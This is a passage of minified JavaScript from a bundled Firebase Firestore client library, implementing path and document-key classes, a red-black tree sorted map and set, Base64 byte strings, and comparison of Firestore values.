n=this.offset,r=this.limit();n<r;n++)e(this.segments[n])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,n){const r=Math.min(e.length,n.length);for(let i=0;i<r;i++){const s=e.get(i),o=n.get(i);if(s<o)return-1;if(s>o)return 1}return e.length<n.length?-1:e.length>n.length?1:0}}class ye extends lo{construct(e,n,r){return new ye(e,n,r)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const n=[];for(const r of e){if(r.indexOf("//")>=0)throw new H(O.INVALID_ARGUMENT,`Invalid segment (${r}). Paths must not contain // in them.`);n.push(...r.split("/").filter(i=>i.length>0))}return new ye(n)}static emptyPath(){return new ye([])}}const px=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class je extends lo{construct(e,n,r){return new je(e,n,r)}static isValidIdentifier(e){return px.test(e)}canonicalString(){return this.toArray().map(e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),je.isValidIdentifier(e)||(e="`"+e+"`"),e)).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)==="__name__"}static keyField(){return new je(["__name__"])}static fromServerFormat(e){const n=[];let r="",i=0;const s=()=>{if(r.length===0)throw new H(O.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);n.push(r),r=""};let o=!1;for(;i<e.length;){const l=e[i];if(l==="\\"){if(i+1===e.length)throw new H(O.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const u=e[i+1];if(u!=="\\"&&u!=="."&&u!=="`")throw new H(O.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);r+=u,i+=2}else l==="`"?(o=!o,i++):l!=="."||o?(r+=l,i++):(s(),i++)}if(s(),o)throw new H(O.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new je(n)}static emptyPath(){return new je([])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class K{constructor(e){this.path=e}static fromPath(e){return new K(ye.fromString(e))}static fromName(e){return new K(ye.fromString(e).popFirst(5))}static empty(){return new K(ye.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&ye.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,n){return ye.comparator(e.path,n.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new K(new ye(e.slice()))}}function mx(t,e){const n=t.toTimestamp().seconds,r=t.toTimestamp().nanoseconds+1,i=Z.fromTimestamp(r===1e9?new pe(n+1,0):new pe(n,r));return new ar(i,K.empty(),e)}function gx(t){return new ar(t.readTime,t.key,-1)}class ar{constructor(e,n,r){this.readTime=e,this.documentKey=n,this.largestBatchId=r}static min(){return new ar(Z.min(),K.empty(),-1)}static max(){return new ar(Z.max(),K.empty(),-1)}}function yx(t,e){let n=t.readTime.compareTo(e.readTime);return n!==0?n:(n=K.comparator(t.documentKey,e.documentKey),n!==0?n:le(t.largestBatchId,e.largestBatchId))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const vx="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class _x{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach(e=>e())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Ro(t){if(t.code!==O.FAILED_PRECONDITION||t.message!==vx)throw t;G("LocalStore","Unexpectedly lost primary lease")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class L{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e(n=>{this.isDone=!0,this.result=n,this.nextCallback&&this.nextCallback(n)},n=>{this.isDone=!0,this.error=n,this.catchCallback&&this.catchCallback(n)})}catch(e){return this.next(void 0,e)}next(e,n){return this.callbackAttached&&X(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(n,this.error):this.wrapSuccess(e,this.result):new L((r,i)=>{this.nextCallback=s=>{this.wrapSuccess(e,s).next(r,i)},this.catchCallback=s=>{this.wrapFailure(n,s).next(r,i)}})}toPromise(){return new Promise((e,n)=>{this.next(e,n)})}wrapUserFunction(e){try{const n=e();return n instanceof L?n:L.resolve(n)}catch(n){return L.reject(n)}}wrapSuccess(e,n){return e?this.wrapUserFunction(()=>e(n)):L.resolve(n)}wrapFailure(e,n){return e?this.wrapUserFunction(()=>e(n)):L.reject(n)}static resolve(e){return new L((n,r)=>{n(e)})}static reject(e){return new L((n,r)=>{r(e)})}static waitFor(e){return new L((n,r)=>{let i=0,s=0,o=!1;e.forEach(l=>{++i,l.next(()=>{++s,o&&s===i&&n()},u=>r(u))}),o=!0,s===i&&n()})}static or(e){let n=L.resolve(!1);for(const r of e)n=n.next(i=>i?L.resolve(i):r());return n}static forEach(e,n){const r=[];return e.forEach((i,s)=>{r.push(n.call(this,i,s))}),this.waitFor(r)}static mapArray(e,n){return new L((r,i)=>{const s=e.length,o=new Array(s);let l=0;for(let u=0;u<s;u++){const h=u;n(e[h]).next(f=>{o[h]=f,++l,l===s&&r(o)},f=>i(f))}})}static doWhile(e,n){return new L((r,i)=>{const s=()=>{e()===!0?n().next(()=>{s()},i):r()};s()})}}function wx(t){const e=t.match(/Android ([\d.]+)/i),n=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(n)}function xo(t){return t.name==="IndexedDbTransactionError"}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jd{constructor(e,n){this.previousValue=e,n&&(n.sequenceNumberHandler=r=>this.ie(r),this.se=r=>n.writeSequenceNumber(r))}ie(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.se&&this.se(e),e}}Jd.oe=-1;function Yl(t){return t==null}function El(t){return t===0&&1/t==-1/0}function Ex(t){return typeof t=="number"&&Number.isInteger(t)&&!El(t)&&t<=Number.MAX_SAFE_INTEGER&&t>=Number.MIN_SAFE_INTEGER}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Sg(t){let e=0;for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e++;return e}function $r(t,e){for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e(n,t[n])}function O0(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ie{constructor(e,n){this.comparator=e,this.root=n||Ue.EMPTY}insert(e,n){return new Ie(this.comparator,this.root.insert(e,n,this.comparator).copy(null,null,Ue.BLACK,null,null))}remove(e){return new Ie(this.comparator,this.root.remove(e,this.comparator).copy(null,null,Ue.BLACK,null,null))}get(e){let n=this.root;for(;!n.isEmpty();){const r=this.comparator(e,n.key);if(r===0)return n.value;r<0?n=n.left:r>0&&(n=n.right)}return null}indexOf(e){let n=0,r=this.root;for(;!r.isEmpty();){const i=this.comparator(e,r.key);if(i===0)return n+r.left.size;i<0?r=r.left:(n+=r.left.size+1,r=r.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal((n,r)=>(e(n,r),!1))}toString(){const e=[];return this.inorderTraversal((n,r)=>(e.push(`${n}:${r}`),!1)),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new va(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new va(this.root,e,this.comparator,!1)}getReverseIterator(){return new va(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new va(this.root,e,this.comparator,!0)}}class va{constructor(e,n,r,i){this.isReverse=i,this.nodeStack=[];let s=1;for(;!e.isEmpty();)if(s=n?r(e.key,n):1,n&&i&&(s*=-1),s<0)e=this.isReverse?e.left:e.right;else{if(s===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const n={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return n}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class Ue{constructor(e,n,r,i,s){this.key=e,this.value=n,this.color=r??Ue.RED,this.left=i??Ue.EMPTY,this.right=s??Ue.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,n,r,i,s){return new Ue(e??this.key,n??this.value,r??this.color,i??this.left,s??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,r){let i=this;const s=r(e,i.key);return i=s<0?i.copy(null,null,null,i.left.insert(e,n,r),null):s===0?i.copy(null,n,null,null,null):i.copy(null,null,null,null,i.right.insert(e,n,r)),i.fixUp()}removeMin(){if(this.left.isEmpty())return Ue.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,n){let r,i=this;if(n(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,n),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),n(e,i.key)===0){if(i.right.isEmpty())return Ue.EMPTY;r=i.right.min(),i=i.copy(r.key,r.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,n))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,Ue.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,Ue.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw X();const e=this.left.check();if(e!==this.right.check())throw X();return e+(this.isRed()?0:1)}}Ue.EMPTY=null,Ue.RED=!0,Ue.BLACK=!1;Ue.EMPTY=new class{constructor(){this.size=0}get key(){throw X()}get value(){throw X()}get color(){throw X()}get left(){throw X()}get right(){throw X()}copy(e,n,r,i,s){return this}insert(e,n,r){return new Ue(e,n)}remove(e,n){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Be{constructor(e){this.comparator=e,this.data=new Ie(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal((n,r)=>(e(n),!1))}forEachInRange(e,n){const r=this.data.getIteratorFrom(e[0]);for(;r.hasNext();){const i=r.getNext();if(this.comparator(i.key,e[1])>=0)return;n(i.key)}}forEachWhile(e,n){let r;for(r=n!==void 0?this.data.getIteratorFrom(n):this.data.getIterator();r.hasNext();)if(!e(r.getNext().key))return}firstAfterOrEqual(e){const n=this.data.getIteratorFrom(e);return n.hasNext()?n.getNext().key:null}getIterator(){return new Ag(this.data.getIterator())}getIteratorFrom(e){return new Ag(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let n=this;return n.size<e.size&&(n=e,e=this),e.forEach(r=>{n=n.add(r)}),n}isEqual(e){if(!(e instanceof Be)||this.size!==e.size)return!1;const n=this.data.getIterator(),r=e.data.getIterator();for(;n.hasNext();){const i=n.getNext().key,s=r.getNext().key;if(this.comparator(i,s)!==0)return!1}return!0}toArray(){const e=[];return this.forEach(n=>{e.push(n)}),e}toString(){const e=[];return this.forEach(n=>e.push(n)),"SortedSet("+e.toString()+")"}copy(e){const n=new Be(this.comparator);return n.data=e,n}}class Ag{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Et{constructor(e){this.fields=e,e.sort(je.comparator)}static empty(){return new Et([])}unionWith(e){let n=new Be(je.comparator);for(const r of this.fields)n=n.add(r);for(const r of e)n=n.add(r);return new Et(n.toArray())}covers(e){for(const n of this.fields)if(n.isPrefixOf(e))return!0;return!1}isEqual(e){return bi(this.fields,e.fields,(n,r)=>n.isEqual(r))}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class L0 extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class We{constructor(e){this.binaryString=e}static fromBase64String(e){const n=function(i){try{return atob(i)}catch(s){throw typeof DOMException<"u"&&s instanceof DOMException?new L0("Invalid base64 string: "+s):s}}(e);return new We(n)}static fromUint8Array(e){const n=function(i){let s="";for(let o=0;o<i.length;++o)s+=String.fromCharCode(i[o]);return s}(e);return new We(n)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return function(n){return btoa(n)}(this.binaryString)}toUint8Array(){return function(n){const r=new Uint8Array(n.length);for(let i=0;i<n.length;i++)r[i]=n.charCodeAt(i);return r}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return le(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}We.EMPTY_BYTE_STRING=new We("");const Tx=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function lr(t){if(ce(!!t),typeof t=="string"){let e=0;const n=Tx.exec(t);if(ce(!!n),n[1]){let i=n[1];i=(i+"000000000").substr(0,9),e=Number(i)}const r=new Date(t);return{seconds:Math.floor(r.getTime()/1e3),nanos:e}}return{seconds:Ce(t.seconds),nanos:Ce(t.nanos)}}function Ce(t){return typeof t=="number"?t:typeof t=="string"?Number(t):0}function Fr(t){return typeof t=="string"?We.fromBase64String(t):We.fromUint8Array(t)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Zd(t){var e,n;return((n=(((e=t==null?void 0:t.mapValue)===null||e===void 0?void 0:e.fields)||{}).__type__)===null||n===void 0?void 0:n.stringValue)==="server_timestamp"}function ef(t){const e=t.mapValue.fields.__previous_value__;return Zd(e)?ef(e):e}function uo(t){const e=lr(t.mapValue.fields.__local_write_time__.timestampValue);return new pe(e.seconds,e.nanos)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ix{constructor(e,n,r,i,s,o,l,u,h){this.databaseId=e,this.appId=n,this.persistenceKey=r,this.host=i,this.ssl=s,this.forceLongPolling=o,this.autoDetectLongPolling=l,this.longPollingOptions=u,this.useFetchStreams=h}}class co{constructor(e,n){this.projectId=e,this.database=n||"(default)"}static empty(){return new co("","")}get isDefaultDatabase(){return this.database==="(default)"}isEqual(e){return e instanceof co&&e.projectId===this.projectId&&e.database===this.database}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _a={mapValue:{}};function Ur(t){return"nullValue"in t?0:"booleanValue"in t?1:"integerValue"in t||"doubleValue"in t?2:"timestampValue"in t?3:"stringValue"in t?5:"bytesValue"in t?6:"referenceValue"in t?7:"geoPointValue"in t?8:"arrayValue"in t?9:"mapValue"in t?Zd(t)?4:Ax(t)?9007199254740991:Sx(t)?10:11:X()}function tn(t,e){if(t===e)return!0;const n=Ur(t);if(n!==Ur(e))return!1;switch(n){case 0:case 9007199254740991:return!0;case 1:return t.booleanValue===e.booleanValue;case 4:return uo(t).isEqual(uo(e));case 3:return function(i,s){if(typeof i.timestampValue=="string"&&typeof s.timestampValue=="string"&&i.timestampValue.length===s.timestampValue.length)return i.timestampValue===s.timestampValue;const o=lr(i.timestampValue),l=lr(s.timestampValue);return o.seconds===l.seconds&&o.nanos===l.nanos}(t,e);case 5:return t.stringValue===e.stringValue;case 6:return function(i,s){return Fr(i.bytesValue).isEqual(Fr(s.bytesValue))}(t,e);case 7:return t.referenceValue===e.referenceValue;case 8:return function(i,s){return Ce(i.geoPointValue.latitude)===Ce(s.geoPointValue.latitude)&&Ce(i.geoPointValue.longitude)===Ce(s.geoPointValue.longitude)}(t,e);case 2:return function(i,s){if("integerValue"in i&&"integerValue"in s)return Ce(i.integerValue)===Ce(s.integerValue);if("doubleValue"in i&&"doubleValue"in s){const o=Ce(i.doubleValue),l=Ce(s.doubleValue);return o===l?El(o)===El(l):isNaN(o)&&isNaN(l)}return!1}(t,e);case 9:return bi(t.arrayValue.values||[],e.arrayValue.values||[],tn);case 10:case 11:return function(i,s){const o=i.mapValue.fields||{},l=s.mapValue.fields||{};if(Sg(o)!==Sg(l))return!1;for(const u in o)if(o.hasOwnProperty(u)&&(l[u]===void 0||!tn(o[u],l[u])))return!1;return!0}(t,e);default:return X()}}function ho(t,e){return(t.values||[]).find(n=>tn(n,e))!==void 0}function Vi(t,e){if(t===e)return 0;const n=Ur(t),r=Ur(e);if(n!==r)return le(n,r);switch(n){case 0:case 9007199254740991:return 0;case 1:return le(t.booleanValue,e.booleanValue);case 2:return function(s,o){const l=Ce(s.integerValue||s.doubleValue),u=Ce(o.integerValue||o.doubleValue);return l<u?-1:l>u?1:l===u?0:isNaN(l)?isNaN(u)?0:-1:1}(t,e);case 3:return Cg(t.timestampValue,e.timestampValue);case 4:return Cg(uo(t),uo(e));case 5:return le(t.stringValue,e.stringValue);case 6:return function(s,o){const l=Fr(s),u=Fr(o);return l.compareTo(u)}(t.bytesValue,e.bytesValue);case 7:return function(s,o){const l=s.split("/"),u=o.split("/");for(let h=0;h<l.length&&h<u.length;h++){const f=le(l[h],u[h]);if(f!==0)return f}return le(l.length,u.length)}(t.referenceValue,e.referenceValue);case 8:return function(s,o){const l=le(Ce(s.latitude),Ce(o.latitude));return l!==0?l:le(Ce(s.longitude),Ce(o.longitude))}(t.geoPointValue,e.geoPointValue);case 9:return Rg(t.arrayValue,e.arrayValue);case 10:return function(s,o){var l,u,h,f;const p=s.fields||{},g=o.fields||{},v=(l=p.value)===null||l===void 0?void 0:l.arrayValue,A=(u=g.value)===null||u===void 0?void 0:u.arrayValue,k=le(((h=v==null?void 0:v.values)===null||h===void 0?void 0:h.length)||0,((f=A==null?void 0:A.values)===null||f===void 0?void 0:f.length)||0);return k!==0?k:Rg(v,A)}(t.mapValue,e.mapValue);case 11:return function(s,o){if(s===_a.mapValue&&o===_a.mapValue)return 0;if(s===_a.mapValue)return 1;if(o===_a.mapValue)return-1;const l=s.fields||{},u=Object.keys(l),h=o.fields||{},f=Object.keys(h);u.sort(),f.sort();for(let p=0;p<u.length&&p<f.length;++p){const g=le(u[p],f[p]);if(g!==0)return g;const v=Vi(l[u[p]],h[f[p]]);if(v!==0)return v}return le(u.length,f.length)}(t.mapValue,e.mapValue);default:throw X()}}function Cg(t,e){if(typeof t=="string"&&typeof e=="string"&&t.length===e.length)return le(t,e);const n=lr(t),r=lr(e),i=le(n.seconds,r.seconds);return i!==0?i:le(n.nanos,r.nanos)}function Rg(t,e){const n=t.values||[],r=e.values||[];for(let i=0;i<n.length&&i<r.length;++i){const s=Vi(n[i],r[i]);if(s)return s}return le(n.length,r.length)}function Oi(t){return Ah(t)}function Ah(t){return"nullValue"in t?"null":"booleanValue"in t?""+t.booleanValue:"integerValue"in t?""+t.integerValue:"doubleValue"in t?""+t.doubleValue:"timestampValue"in t?function(n){const r=lr(n);return`time(${r.seconds},${r.nanos})`}(t.timestampValue):"stringValue"in t?t.stringValue:"bytesValue"in t?function(n){return Fr(n).toBase64()}(t.bytesValue):"referenceValue"in t?function(n){return K.fromName(n).toString()}(t.referenceValue):"geoPointValue"in t?function(n){return`geo(${n.latitude},${n.longitude})`}(t.geoPointValue):"arrayValue"in t?function(n){let r="[",i=!0;for(const s of n.values||[])i?i=!1:r+=",",r+=Ah(s);return r+"]"}(t.arrayValue):"mapValue"in t?function(n){const r=Object.keys(n.fields||{}).sort();let i="{",s=!0;for(const o of r)s?s=!1:i+=",",i+=`${o}:${Ah(n.fields[o])}`;return i+"}"}(t.mapValue):X()}function xg(t,e){return{referenceValue:`projects/${t.projectId}/databases/${t.database}/documents/${e.path.canonicalString()}`}}function Ch(t){return!!t&&"integerValue"in t}function tf(t){return!!t&&"arrayValue"in t}function kg(t){return!!t&&"nullValue"in t}function Pg(t){return!!t&&"doubleValue"in t&&isNaN(Number(t.doubleValue))}function Ua(t){return!!t&&"mapValue"in t}function Sx(t){var e,n;return((n=(((e=t==null?void 0:t.mapValue)===null||e===void 0?void 0:e.fields)||{}).__type__)===null||n===void 0?void 0:n.stringValue)==="__vector__"}function Ms(t){if(t.geoPointValue)return{geoPointValue:Object.assign({},t.geoPointValue)};if(t.timestampValue&&typeof t.timestampValue=="object")return{timestampValue:Object.assign({},t.timestampValue)};if(t.mapValue){const e={mapValue:{fields:{}}};return $r(t.mapValue.fields,(n,r)=>e.mapValue.fields[n]=Ms(r)),e}if(t.arrayValue){const e={arrayValue:{values:[]}};for(let n=0;n<(t.arrayValue.values||[]).length;++n)e.arrayValue.values[n]=Ms(t.arrayValue.values[n]);return e}return Object.assign({},t)}function Ax(t){return(((t.mapValue||{}).fields||{}).__type__||{}).stringValue==="__max__"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
